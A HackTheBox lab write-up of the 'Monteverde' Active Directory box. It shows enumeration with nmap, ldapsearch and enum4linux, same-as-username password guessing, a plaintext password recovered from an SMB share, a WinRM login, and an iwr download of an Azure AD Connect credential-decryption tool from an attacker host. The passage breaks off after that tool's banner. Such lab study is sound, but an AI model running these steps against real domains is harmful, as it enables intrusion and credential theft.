---
title: "HackTheBox Writeup: Monteverde"
date: 2020-07-19T22:52:30+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

Monteverde is very easy for a Medium box but for that I also have to thank another HTB member, VbScrub, who automated the privilege escalation method for a lot of people, myself included, when apparently before that some tweaking was required beforehand, perhaps making me skip some of the difficulty in this challenge.

Nonetheless, this was a fun little box albeit I'm never a fan of bruteforcing, which is how the first pair of credentials is found. Those credentials are used to access an SMB share where a new password is located and used to login as a second user who can escalate privileges via a Microsoft Azure exploit.

![img](/images/writeup-monteverde/1.png)

---

## Remote enumeration

nmap returns quite a few ports, mostly useless for us, save for 389 (LDAP), 445 (SMB), and 5985 (WinRM):

```aaa
┌─[baud@parrot]─[~/HTB/monteverde]
└──╼ $sudo nmap -sC -sV -oA nmapFull -p- -T4 10.10.10.172
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 16:48 CET
Nmap scan report for 10.10.10.172
Host is up (0.11s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-24 16:07:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49778/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/24%Time=5E53F229%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11m16s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-24T16:09:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 768.16 seconds
```

Anonymous SMB sessions are not allowed so we cannot use it to access shares or enumerate the box at the moment, however LDAP does allow anonymous access so we can gather some information from AD objects.

Several tools can be used for the job, if CLI is preferred ldapsearch is a valid option:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/monteverde]
└──╼ $ldapsearch -x -h 10.10.10.172 -b "DC=MEGABANK,DC=LOCAL" -s sub "(objectclass=*)" > ldapResults
```

"-x" tells the program to connect to the host (specified by -h) in an anonymous session, -b is the base of the AD tree where to start looking for the objects we're interested in, and -s specifies a search filter. In this case we want to take a look at all the objects we can see, and we redirect the output (since it'll be very lengthy) to a file.

Among the many objects we can examine in the output is a list of user accounts:

```aaa
# Mike Hope, London, MegaBank Users, MEGABANK.LOCAL
dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Mike Hope
sn: Hope
givenName: Mike
distinguishedName: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOC
 AL
instanceType: 4
whenCreated: 20200102234005.0Z
whenChanged: 20200103132436.0Z
displayName: Mike Hope
uSNCreated: 28724
memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
memberOf: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
uSNChanged: 41222
name: Mike Hope
objectGUID:: +W/bvN0OPkWmWWupohoYJw==
userAccountControl: 66048
badPwdCount: 3
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\mhope
homeDrive: H:
badPasswordTime: 132270339920310872
lastLogoff: 0
lastLogon: 132225317990375004
pwdLastSet: 132224820059089237
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UQQYAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: mhope
sAMAccountType: 805306368
userPrincipalName: mhope@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103123551.0Z
dSCorePropagationData: 20200102234005.0Z
dSCorePropagationData: 16010101000001.0Z
mS-DS-ConsistencyGuid:: +W/bvN0OPkWmWWupohoYJw==
lastLogonTimestamp: 132225314765977844
-------------------------------------------------------
# Dimitris Galanos, Athens, MegaBank Users, MEGABANK.LOCAL
dn: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Dimitris Galanos
sn: Galanos
givenName: Dimitris
distinguishedName: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK
 ,DC=LOCAL
instanceType: 4
whenCreated: 20200103130610.0Z
whenChanged: 20200103134739.0Z
displayName: Dimitris Galanos
uSNCreated: 41152
memberOf: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41250
name: Dimitris Galanos
objectGUID:: PdXCjD6iU0uBUJyxa4g/FA==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\dgalanos
homeDrive: H:
badPasswordTime: 132270340114377100
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225303705196597
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNQoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: dgalanos
sAMAccountType: 805306368
userPrincipalName: dgalanos@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130610.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: PdXCjD6iU0uBUJyxa4g/FA==
-------------------------------------------------------
# Ray O'Leary, Toronto, MegaBank Users, MEGABANK.LOCAL
dn: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ray O'Leary
sn: O'Leary
givenName: Ray
distinguishedName: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=
 LOCAL
instanceType: 4
whenCreated: 20200103130805.0Z
whenChanged: 20200103134739.0Z
displayName: Ray O'Leary
uSNCreated: 41161
memberOf: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41249
name: Ray O'Leary
objectGUID:: 3DFb4iTqDkqLISG92VNrHw==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\roleary
homeDrive: H:
badPasswordTime: 132270339967654592
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225304858321672
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNgoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: roleary
sAMAccountType: 805306368
userPrincipalName: roleary@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130805.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: 3DFb4iTqDkqLISG92VNrHw==
-------------------------------------------------------
# Sally Morgan, New York, MegaBank Users, MEGABANK.LOCAL
dn: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Sally Morgan
sn: Morgan
givenName: Sally
distinguishedName: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,D
 C=LOCAL
instanceType: 4
whenCreated: 20200103130921.0Z
whenChanged: 20200103134739.0Z
displayName: Sally Morgan
uSNCreated: 41178
memberOf: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
uSNChanged: 41251
name: Sally Morgan
objectGUID:: F60h1VDDkkWl/C8e8bOXuQ==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
homeDirectory: \\monteverde\users$\smorgan
homeDrive: H:
badPasswordTime: 132270334405779644
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225305616290842
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNwoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: smorgan
sAMAccountType: 805306368
userPrincipalName: smorgan@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130921.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: F60h1VDDkkWl/C8e8bOXuQ==
-------------------------------------------------------
```

And some service accounts too:

```aaa
# svc-ata, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-ata
givenName: svc-ata
distinguishedName: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103125831.0Z
whenChanged: 20200103134739.0Z
displayName: svc-ata
uSNCreated: 41086
uSNChanged: 41246
name: svc-ata
objectGUID:: f6KUWDDWtUaHZ/TAQSOZXw==
userAccountControl: 66048
badPwdCount: 7
codePage: 0
countryCode: 0
badPasswordTime: 132270335002030939
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225299113321691
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKwoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc-ata
sAMAccountType: 805306368
userPrincipalName: svc-ata@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103125831.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: f6KUWDDWtUaHZ/TAQSOZXw==
-------------------------------------------------------
# svc-bexec, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-bexec
givenName: svc-bexec
distinguishedName: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103125955.0Z
whenChanged: 20200103134739.0Z
displayName: svc-bexec
uSNCreated: 41101
uSNChanged: 41247
name: svc-bexec
objectGUID:: klT6nv0Dh0ufrbJXcL21TA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225299958634219
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULAoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc-bexec
sAMAccountType: 805306368
userPrincipalName: svc-bexec@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103125955.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: klT6nv0Dh0ufrbJXcL21TA==
-------------------------------------------------------
# svc-netapp, Service Accounts, MEGABANK.LOCAL
dn: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc-netapp
givenName: svc-netapp
distinguishedName: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
instanceType: 4
whenCreated: 20200103130142.0Z
whenChanged: 20200103134739.0Z
displayName: svc-netapp
uSNCreated: 41110
uSNChanged: 41248
name: svc-netapp
objectGUID:: 0huK9EdmGU+LBAJXashjNg==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132225301027862639
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULQoAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: svc-netapp
sAMAccountType: 805306368
userPrincipalName: svc-netapp@MEGABANK.LOCAL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
dSCorePropagationData: 20200103130142.0Z
dSCorePropagationData: 16010101000000.0Z
mS-DS-ConsistencyGuid:: 0huK9EdmGU+LBAJXashjNg==
-------------------------------------------------------
```

ldapsearch is more useful when we need more information than just usernames though, because of how much data it can return with a generic query.

Another way of finding those usernames as well as other potentially useful information is by running enum4linux, which runs different techniques to enumerate a Windows host, including NULL SMB sessions:

```aaa
┌─[✗]─[baud@parrot]─[~/jxplorer]
└──╼ $enum4linux 10.10.10.172 2>/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Feb 24 18:51:00 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================== 
|    Session Check on 10.10.10.172    |
 ===================================== 
[+] Server 10.10.10.172 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.172    |
 ====================================== 
[+] Got OS info for 10.10.10.172 from smbclient: 
[+] Got OS info for 10.10.10.172 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 ========================================= 
|    Share Enumeration on 10.10.10.172    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ==================================================== 
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 


[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MEGABANK
	[+] Builtin

[+] Password Info for Domain: MEGABANK

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: 41 days 23 hours 53 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.172    |
 ============================== 

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan

 ======================================================================= 
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================= 
|    Getting printer info for 10.10.10.172    |
 ============================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Feb 24 18:53:51 2020
```

---

## Weak credentials

Not knowing what else to look for I decided to use those usernames to find possible credentials where the password is the same as the username, even if this could be done very easily with hydra by saving the usernames into a file and using it as a dictionary for both usernames and passwords, I was lucky and found it almost immediately by manual attempts via LDAP:

![img](/images/writeup-monteverde/2.png)

These are the credentials that worked:

```aaa
User: SABatchJobs
Pass: SABatchJobs
```

The account works over SMB too, so now we can list shares:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/monteverde]
└──╼ $smbclient -U SABatchJobs -L \\\\10.10.10.172
Enter WORKGROUP\SABatchJobs's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	azure_uploads   Disk      
	C$              Disk      Default share
	E$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	users$          Disk      
SMB1 disabled -- no workgroup availabl
```

Specifically, the account has access to the users$ share, where an interesting file is found inside the mhope user's folder:

```aaa
┌─[baud@parrot]─[~/HTB/monteverde]
└──╼ $smbclient -U SABatchJobs \\\\10.10.10.172\\users$
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \> cd mhope
smb: \mhope\> dir
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

		524031 blocks of size 4096. 519955 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
```

It contains a password, which we can imagine belongs to the user mhope and if we are lucky they might have re-used it as their own account's password:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

So we have a possible second pair of credentials now:

```aaa
User: mhope
Pass: 4n0therD4y@n0th3r$
```

We can check if these work by logging into WinRM since port 5985 is open:

```aaa
┌─[baud@parrot]─[~/HTB/monteverde]
└──╼ $evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents>
```

The credentials are valid and we can claim the user flag, the (short) local enumeration phase can begin.

---

## Local enumeration

By taking a look at the Program Files directory we see some unusual folders regarding Microsoft Azure, Microsoft's own cloud service:

```aaa
*Evil-WinRM* PS C:\> dir "program files"


    Directory: C:\program files


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d-----         1/2/2020   9:36 PM                Common Files                                                                                                                                                                                            
d-----         1/2/2020   2:46 PM                internet explorer                                                                                                                                                                                       
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services                                                                                                                                                                             
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect                                                                                                                                                                
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader                                                                                                                                                       
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent                                                                                                                                                            
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync                                                                                                                                                                                 
d-----         1/2/2020   2:31 PM                Microsoft SQL Server                                                                                                                                                                                    
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0                                                                                                                                                                            
d-----         1/2/2020   2:32 PM                Microsoft.NET                                                                                                                                                                                           
d-----         1/3/2020   5:28 AM                PackageManagement                                                                                                                                                                                       
d-----         1/2/2020   9:37 PM                VMware                                                                                                                                                                                                  
d-r---         1/2/2020   2:46 PM                Windows Defender                                                                                                                                                                                        
d-----         1/2/2020   2:46 PM                Windows Defender Advanced Threat Protection                                                                                                                                                             
d-----        9/15/2018  12:19 AM                Windows Mail                                                                                                                                                                                            
d-----         1/2/2020   2:46 PM                Windows Media Player                                                                                                                                                                                    
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform                                                                                                                                                                             
d-----        9/15/2018  12:28 AM                windows nt                                                                                                                                                                                              
d-----         1/2/2020   2:46 PM                Windows Photo Viewer                                                                                                                                                                                    
d-----        9/15/2018  12:19 AM                Windows Portable Devices                                                                                                                                                                                
d-----        9/15/2018  12:19 AM                Windows Security                                                                                                                                                                                        
d-----         1/3/2020   5:28 AM                WindowsPowerShell
```

When Azure is installed on a computer it means there will be a local group to manage Azure called Azure Admins, let's see which users are members of that group:

```aaa
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> net group "azure admins"
Group name     Azure Admins
Comment        

Members

-------------------------------------------------------------------------------
AAD_987d7f2f57d2         Administrator            mhope                    
The command completed successfully.
```

The account under our control is an Azure Admin then, and it turns out this opens up huge doors for escalating our privileges.

---

## Reading stored administrator credentials with Azure

In less tham a minute of Googling about the Azure Admins group I find [this very interesting article](https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), written by another HTB player, reporting how Azure stores the administrator's credentials locally in an easy-to-decrypt way, so that they can be easily retrieved and decrypted.

VbScrub provided a handy precompiled binary that can be easily dropped on the box and tested, and of course instructions on how to use it.

So let's download the two required files on the box:

```aaa
*Evil-WinRM* PS C:\> cd "program files\Microsoft Azure AD Sync\bin"
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> iwr http://10.10.14.144:9090/mcrypt.dll -outfile c:\users\mhope\downloads\mcrypt.dll
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> iwr http://10.10.14.144:9090/AdDecrypt.exe -outfile c:\users\mhope\downloads\c.exe
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> dir c:\users\mhope\downloads\


    Directory: C:\users\mhope\downloads


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        2/24/2020  12:00 PM          14848 c.exe                                                                                                                                                                                                   
-a----        2/24/2020  12:00 PM         334248 mcrypt.dll
```

But by running the exploit we get an error:

```aaa
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> c:\users\mhope\downloads\c.exe

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
